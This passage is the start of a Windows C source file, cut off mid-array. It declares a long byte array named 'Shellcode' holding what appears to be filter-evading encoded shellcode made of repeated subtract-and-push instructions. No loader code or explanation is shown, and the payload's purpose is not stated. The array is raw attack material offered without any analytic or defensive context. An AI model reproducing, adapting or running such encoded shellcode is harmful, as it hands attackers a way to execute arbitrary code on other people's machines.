#include <windows.h>
#include <stdio.h>
 
unsigned char Shellcode[] = "\x54\x58\x2d\x8f\x7c\xff\xff\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x5c\x25\x00\x00\x00\x00\x25\x00\x00\x00\x00\x2d\x2b\xc0\x5d\x36\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\xa0\xbb\xb2\xf0\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\xf1\x51\x0f\x11\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x5e\xce\xbf\x39\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x52\x5e\x3f\x25\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\xf6\xf0\x19\xd4\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x20\xdb\x58\xc1\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\xbe\xa0\xd7\x02\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x51\xbb\x94\xf9\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x70\x9e\x52\x25\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x91\xce\x6f\x8e\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\xff\xd5\x91\x54\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x6b\xf6\xeb\xe2\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\xf2\xc7\x68\x57\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\xe2\x9c\xb7\x2c\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x60\x09\xa7\xfa\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x2d\x42\x28\x2d\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x6f\xf2\xcd\xd3\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x17\x82\x4f\x75\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\xb1\xc0\x6c\x66\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x7f\xe3\x22\x20\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x59\x67\x72\x1e\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x95\xc3\x2b\xa8\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\xbf\xc8\xd2\xea\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x01\x58\x8f\x06\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x0f\x8e\xba\x88\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x84\x52\x2b\x97\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x15\x3a\x39\xc1\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x00\xf9\xe6\xba\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x4c\x80\xfe\xff\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x1c\xaf\x40\xa6\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\xfd\x3a\x57\x8e\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x4a\x6e\x81\x23\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\xe7\xa5\xbf\x34\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\xb4\x92\x94\xe5\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x2a\x55\xc3\x79\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x31\x4e\xe2\x69\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x38\xf6\x3b\x65\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x53\x05\x36\xa4\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\xae\xb2\x8a\xdb\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x82\x19\x3e\xbf\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\xf3\xe4\x4d\x23\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\xc5\x1c\xdb\xdd\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x80\x98\xc8\x14\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x55\xc9\x2c\x3d\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x3c\x38\x1a\x73\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x89\x28\x0f\x6a\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\xb8\x63\x8d\xe1\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\xb3\x05\x4e\xc0\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x83\xe9\x28\x05\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x26\x9d\xfb\xca\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x8e\xe6\x83\xee\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x5d\x57\xaf\x35\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x19\x46\x70\x89\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x7a\x07\x0d\x38\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x0b\x51\x51\xd3\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x4e\xb9\x6b\x2a\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\xe9\xe5\x0b\x3b\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\xc8\x3e\xf4\x53\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x4a\x94\xa6\x21\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\x71\x6a\x7a\x01\x2d\x00\x00\x00\x00\x2d\x00\x00\x00\x00\x50\x2d\